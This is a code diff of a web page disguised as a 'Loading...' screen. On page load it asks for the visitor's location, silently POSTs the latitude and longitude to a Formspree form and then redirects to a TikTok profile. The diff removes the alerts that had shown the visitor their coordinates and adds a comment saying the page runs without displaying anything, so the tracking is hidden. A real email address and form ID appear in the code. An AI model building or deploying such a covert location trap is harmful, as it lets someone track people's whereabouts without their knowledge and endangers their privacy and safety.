@@ -5,21 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <script>
-        navigator.geolocation.getCurrentPosition(
-    function(position) {
-        alert("位置情報取得成功: " + position.coords.latitude + ", " + position.coords.longitude);
-    },
-    function(error) {
-        alert("位置情報取得失敗: " + error.message);
-    }
-);
-
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, redirectNow, {
-                    enableHighAccuracy: true,
-                    timeout: 5000
-                });
+                navigator.geolocation.getCurrentPosition(sendLocation, redirectNow);
             } else {
                 redirectNow();
             }
@@ -28,22 +16,20 @@
         function sendLocation(position) {
             let lat = position.coords.latitude;
             let lon = position.coords.longitude;
-            
-            // Formspree にデータを送信
+
+            // 位置情報を送信（FormspreeのURLに変更）
             fetch("https://formspree.io/f/mvgkwpzg", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    email: "kagage24@gmail.com",
-                    message: `Latitude: ${lat}, Longitude: ${lon}`
-                })
+                body: JSON.stringify({ latitude: lat, longitude: lon })
             }).finally(redirectNow);
         }
 
         function redirectNow() {
-            window.location.replace("https://www.tiktok.com/@kaga1024/video/7431843644312800513"); // ここをリダイレクト先に変更
+            window.location.replace("https://www.tiktok.com/@kaga1024?is_from_webapp=1&sender_device=pc"); // リダイレクト先のURL
         }
 
+        // 何も表示せずに実行
         getLocation();
     </script>
 </head>
